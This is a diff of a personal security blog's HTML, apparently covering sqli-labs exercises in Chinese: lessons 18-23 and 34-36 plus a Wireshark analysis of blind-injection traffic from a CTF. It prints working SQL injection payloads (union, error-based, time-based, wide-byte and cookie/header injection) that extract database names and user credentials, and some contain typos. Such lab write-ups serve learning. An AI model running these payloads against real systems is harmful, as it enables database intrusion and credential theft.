class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 13 Feb 2022 14:42:24 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 1758</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Less-34- Bypass Add SLASHES<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#000000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;</span>&gt;</span> Welcome<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#FF0000&quot;</span>&gt;</span> Dhakkan <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>  <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding-top:10px; font-size:15px;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:15px; height:30px;&quot;</span>&gt;</span>Username : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span> Password  : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:9px;margin-left:90px;&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/Less-34.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>= <span class="string">&quot;#FFFF00&quot;</span> <span class="attr">font</span> <span class="attr">size</span> = <span class="string">4</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#0000ff&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Login name:1<span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Password:2<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&#x27;4&#x27;</span> <span class="attr">color</span>= <span class="string">&quot;#33FFFF&quot;</span>&gt;</span></span><br><span class="line">Hint: The Username you input is escaped as : aß\&#x27; union select 1,2#<span class="tag">&lt;<span class="name">br</span>&gt;</span>Hint: The Password you input is escaped as : n<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>倒数第12行看到我们注入成功了，后面明显我们可以套用联合查询来注入</p>
+<h2 id="网上一直在传的方法二"><a href="#网上一直在传的方法二" class="headerlink" title="网上一直在传的方法二"></a>网上一直在传的方法二</h2><p>get型注入是直接以url形式提交的，而post型就会对数据进行urlencode处理</p>
+<p>所以使</p>
+<p>�’ union select  1,database()#</p>
+<p>来注入,</p>
+<p><img src="https://s2.loli.net/2022/02/14/HjPdvs5g7cJSBXt.png" alt="QQ截图20220214155510.png"></p>
+<p><img src="https://s2.loli.net/2022/02/14/6u7mKTAbo2CPH8Y.png" alt="QQ截图20220214155606.png"></p>
+<h1 id="lesson-35"><a href="#lesson-35" class="headerlink" title="lesson 35"></a>lesson 35</h1><p>首先是多次尝试发现没有对数据进行包裹</p>
+<p>?id=-1 union select 1,database(),3–+</p>
+<p><img src="https://s2.loli.net/2022/02/14/yz4cmQ6qHSXsiEb.png" alt="QQ截图20220214164727.png"></p>
+<p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p><img src="https://s2.loli.net/2022/02/14/8df37KGFqsthcvb.png" alt="QQ截图20220214165031.png"></p>
+<p>然后发现连数据都不包裹的，竟然还会把我的单引号注释掉</p>
+<p>使用16进制来绕过注释</p>
+<h2 id="时间（延迟）注入"><a href="#时间（延迟）注入" class="headerlink" title="时间（延迟）注入"></a>时间（延迟）注入</h2><p>?id=1 and if(    length(database())=1,sleep(3),1    )–+</p>
+<p>?id=1 and if(      left(database(),1)=’s’,sleep(3),1     )–+</p>
+<h1 id="lesson-36"><a href="#lesson-36" class="headerlink" title="lesson 36"></a>lesson 36</h1><p>使用了mysql_real_escape_string()函数来进行过滤，对于该函数而言，它会转义</p>
+<p>\x00 \n \r ‘ “ \x1a</p>
+<p>是用单引号来对数据进行包裹</p>
+<p>并且不出以外的有宽字节注入</p>
+<p>?id=-1%df’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p><img src="https://s2.loli.net/2022/02/14/7p1mGWcyLghszRf.png" alt="QQ截图20220214183150.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/31/lesson27/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -300,7 +900,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/31/lesson27/" class="post-title-link" itemprop="url">lesson27</a>
+          <a href="/2022/01/31/lesson27/" class="post-title-link" itemprop="url">lesson27_28a</a>
         </h2>
 
         <div class="post-meta-container">
@@ -318,7 +918,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-13 16:15:23" itemprop="dateModified" datetime="2022-02-13T16:15:23+08:00">2022-02-13</time>
+        <time title="Modified: 2022-02-18 20:26:39" itemprop="dateModified" datetime="2022-02-18T20:26:39+08:00">2022-02-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -389,7 +989,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/less24/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/lesson24/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -402,7 +1002,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/26/less24/" class="post-title-link" itemprop="url">less24</a>
+          <a href="/2022/01/26/lesson24/" class="post-title-link" itemprop="url">lesson24_26a</a>
         </h2>
 
         <div class="post-meta-container">
@@ -420,7 +1020,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-11 13:34:17" itemprop="dateModified" datetime="2022-02-11T13:34:17+08:00">2022-02-11</time>
+        <time title="Modified: 2022-02-18 20:28:11" itemprop="dateModified" datetime="2022-02-18T20:28:11+08:00">2022-02-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -691,522 +1291,6 @@
 <p>例如：Uryyb,Jrypbzr   ==&gt; Hello,Welcome</p>
 <p><a target="_blank" rel="noopener" href="http://www.mxcz.net/tools/rot13.aspx">凯撒ROT13在线解码</a></p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Dog_Captain/article/d">https://blog.csdn.net/Dog_Captain/article/d</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/Untitled/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/28/Untitled/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-28 09:32:43" itemprop="dateCreated datePublished" datetime="2021-11-28T09:32:43+08:00">2021-11-28</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/lesson18/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/28/lesson18/" class="post-title-link" itemprop="url">lesson18-23</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-28 09:20:42" itemprop="dateCreated datePublished" datetime="2021-11-28T09:20:42+08:00">2021-11-28</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-10 11:00:00" itemprop="dateModified" datetime="2022-02-10T11:00:00+08:00">2022-02-10</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="less18-header-injection"><a href="#less18-header-injection" class="headerlink" title="less18 header injection"></a>less18 header injection</h1><p><img src="https://i.loli.net/2021/11/28/iUSL7pB8aXCKezf.png" alt="header injection.png"></p>
-<p>登入成功返回我的ip地址和user agent</p>
-<p>因为user agent在登入成功后会回显，所以理所当然的尝试在header的user agent注入</p>
-<p>注入语句’ or updatexml(1,concat(0x7e,(database())),1) or ‘1’ =’1</p>
-<p>直接在抓包处改</p>
-<p><img src="https://i.loli.net/2021/11/28/IUwgv12aLkqbKDA.png" alt="header injection1.png"></p>
-<p>后面就是正常的把database()改成其他的查库查列操作</p>
-<p>或者使用方法二：</p>
-<p>’ or updatexml（1，concat（0x7e，（database（））），1），‘’，‘’）#进行注入</p>
-<h1 id="lesson-19-referer-injection"><a href="#lesson-19-referer-injection" class="headerlink" title="lesson 19 referer injection"></a>lesson 19 referer injection</h1><p>同样的方法选择用</p>
-<ol>
-<li><p>‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’=’1</p>
-</li>
-<li><p>‘ or updatexml(1,concat(0x7e,(database())),1) ,’’)#</p>
-<p>来闭合在抓包referer处修改注入</p>
-<p>与lesson18相同。</p>
-</li>
-</ol>
-<h1 id="lesson-20-cookie-injection"><a href="#lesson-20-cookie-injection" class="headerlink" title="lesson 20 cookie injection"></a>lesson 20 cookie injection</h1><p>抓包，在cookie那里注入</p>
-<p>cookie：uname=1’ union select 1,2,database()#</p>
-<p>利用联合查询注入</p>
-<p>查表</p>
-<p>cookie：uname=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ )#</p>
-<p>查列</p>
-<p>cookie：uname=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’#</p>
-<p>查字段</p>
-<p>cookie：uname=1’ union select 1，2，group_concat(concat_ws(‘@@’,id,username,password)) from users</p>
-<h1 id="lesson-21-cookie-injection"><a href="#lesson-21-cookie-injection" class="headerlink" title="lesson 21 cookie injection"></a>lesson 21 cookie injection</h1><p>跟lesson20思路一样，就是cookie明文经过base64加密</p>
-<p><a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3">base64在线加密</a></p>
-<p>查库</p>
-<p>‘) union select 1,2,database()#</p>
-<p>表</p>
-<p>‘) union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’),3#</p>
-<p>列</p>
-<p>)’ union select 1,2,(select goup_concat(column_name) from information_schema.columns where table_name=’users’)#</p>
-<p>字段</p>
-<p>‘) union select 1,group_concat(concat_ws(‘@@’,username,password)),2#</p>
-<h1 id="lession-22-cookie-injection"><a href="#lession-22-cookie-injection" class="headerlink" title="lession 22 cookie injection"></a>lession 22 cookie injection</h1><p>和上一关一样，只是闭合单引号变成了双引号。</p>
-<h1 id="lession-23"><a href="#lession-23" class="headerlink" title="lession 23"></a>lession 23</h1><p><img src="https://s2.loli.net/2022/02/09/VkWy5IBbQf1gpc2.png" alt="QQ截图20220209170517.png"></p>
-<p>这里对#和–都做了转译</p>
-<p>法一：因为被处理的是注释符号，所以只要用–+和#以外的的注释符就行了。（用;%00来注释）</p>
-<p>法二：避免使用注释符，而是用and ‘1’=’1来包裹</p>
-<p>查库</p>
-<p>？id=-1’ union select 1,database(),3 and ‘1’=’1</p>
-<p>查表</p>
-<p>？id=-1’ union select 1,goup_concat(table_name)from information_schema.tables where table_schema=’security’ limit 0,1),3 and ‘1’=’1</p>
-<p>查列</p>
-<p>？id=-1’ union select 1,group_concat(column_name)from information_schema.columns where table=’users’),3 and’1’=’1 </p>
-<p>查字段</p>
-<p>？id=-1’ union select 1,group_concat(concat_ws(@@,username,password))from users,3 and ‘1’=’1</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/" class="post-title-link" itemprop="url">“流量包分析”之sqltest</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-24 20:41:47" itemprop="dateCreated datePublished" datetime="2021-11-24T20:41:47+08:00">2021-11-24</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-11-28 20:30:42" itemprop="dateModified" datetime="2021-11-28T20:30:42+08:00">2021-11-28</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>原本只是想刷一刷sql注入的却意外的找到了一道misc题但是和sql注入关系紧密的sqltest。</p>
-<p>这是一道流量包分析，首先先下载流量包。</p>
-<p>然后百度下载可以打开浏览包的软件，O(∩_∩)O哈哈~~</p>
-<h2 id="第一次查看流量包"><a href="#第一次查看流量包" class="headerlink" title="第一次查看流量包"></a>第一次查看流量包</h2><p><img src="https://i.loli.net/2021/11/24/Zk8itW9lrwKmVO4.png" alt="QQ截图20211124204947.png"></p>
-<p>这密密麻麻的字确实让人望而却步，但是还是可以看出一些端倪。</p>
-<p>比如其中有一些get请求意外的相似：</p>
-<p>GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;99 </p>
-<p>8084    11.866325    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 </p>
-<p>8094    11.872110    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 HTTP/1.1 </p>
-<p>仔细看这不就是布尔盲注的爆破内容。</p>
-<p>刚好解释了为啥这题的名字叫做sqltest</p>
-<p>所以就简单了，道理就只要把最后一句查字段的爆破类容找出来就行，ascii码转一下就行了，但是！！我wireshark（查看浏览包的应用）没玩明白。。。惨惨π_π。</p>
-<p>在查了一大堆教程以后，终于有了一点眉目。</p>
-<p>首先在过滤器里搜索http（协议） get（请求）</p>
-<p><img src="https://i.loli.net/2021/11/24/jBCIbVvTX5iGsxQ.png" alt="QQ截图20211124220332.png"></p>
-<p>发现返回的的长度有两种1095和1025</p>
-<p><img src="https://i.loli.net/2021/11/24/4ThqzAeRiHmEwul.png" alt="QQ截图20211124221517.png"></p>
-<p>之所以返回变长了就是多了上面的部分。因此可知1095的语句是正确的</p>
-<p>然后导出过滤concat</p>
-<p><img src="https://i.loli.net/2021/11/24/luDcLFwZepoXjb5.png" alt="QQ截图20211124222854.png"></p>
-<p>然后判断正确ascii码正确的为</p>
-<p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50  56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p>
-<p>所对应为</p>
-<p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
-<h1 id="关于wireshark"><a href="#关于wireshark" class="headerlink" title="关于wireshark"></a>关于wireshark</h1><p>wireshark是一个网络封包工具，可以截取各种网络数据包，并显示数据包详细信息</p>
-<p><img src="https://i.loli.net/2021/11/26/oMcbNGYlUpP4Iqu.png" alt="wireshark.png"></p>
-<p>详细使用类容参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzwwhhpp/article/details/113077747?utm_source=app&app_version=4.18.0&code=app_1562916241&uLinkId=usr1mkqgl919blen">csdn</a></p>
-<p>执行ping+域名</p>
-<h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="https://i.loli.net/2021/11/26/2HWM6ptYimaIcOR.png" alt="wireshark过滤器.png"></p>
-<h3 id="数据包列表"><a href="#数据包列表" class="headerlink" title="数据包列表"></a>数据包列表</h3><p><img src="https://i.loli.net/2021/11/26/Lct7mxsWI3AjToM.png" alt="wireshark2.png"></p>
-<h3 id="数据包详细信息"><a href="#数据包详细信息" class="headerlink" title="数据包详细信息"></a>数据包详细信息</h3><ol>
-<li>frame：物理层数据帧概况</li>
-<li>Ethernet||：数据链路层以太网头部信息</li>
-<li>internet Protocol Version 4:互联网层IP包头部信息</li>
-<li>Transmission control protocol：传输层T的数据段头部信息</li>
-<li>Hypertext Transfer Protocol：应用层信息</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/19/wp/" class="post-title-link" itemprop="url">finalsql</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-19 20:53:10" itemprop="dateCreated datePublished" datetime="2021-11-19T20:53:10+08:00">2021-11-19</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-06 16:53:11" itemprop="dateModified" datetime="2022-02-06T16:53:11+08:00">2022-02-06</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
